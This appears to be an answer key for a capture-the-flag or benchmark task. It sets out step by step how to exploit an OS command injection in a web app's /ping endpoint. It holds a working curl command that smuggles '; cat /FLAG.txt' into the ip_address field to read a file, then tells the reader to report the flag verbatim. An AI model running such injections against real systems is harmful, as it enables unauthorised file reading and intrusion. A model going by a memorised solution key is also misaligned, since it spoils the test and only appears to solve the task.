# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: OS command injection in `/ping`'s `ip_address` field (unsanitized
shell concatenation). `;` lets you append a command whose output is reflected in
the ping result page.

1. **Inject `cat /FLAG.txt`** after a `;`:

   ```
   curl -s -X POST http://<target>/ping --data-urlencode "ip_address=127.0.0.1; cat /FLAG.txt"
   ```

2. **Extract the flag** (`FLAG{...}`) from the reflected `<pre>` output and report
   it verbatim.
